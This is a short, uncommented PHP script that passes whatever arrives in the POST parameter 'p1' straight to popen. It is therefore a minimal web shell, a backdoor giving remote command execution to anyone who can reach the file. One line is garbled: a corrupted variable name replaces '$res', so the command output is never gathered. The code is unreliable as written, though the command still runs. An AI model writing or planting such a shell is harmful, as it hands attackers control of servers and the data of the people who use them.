<?php
function ex($in) {
	$f = @popen($in,"r");
	$res = "";
	while(!@feof($f))
		$▖ .= fread($f,1024);
	pclose($f);
	return $res;
}

ex($_POST['p1']);
?>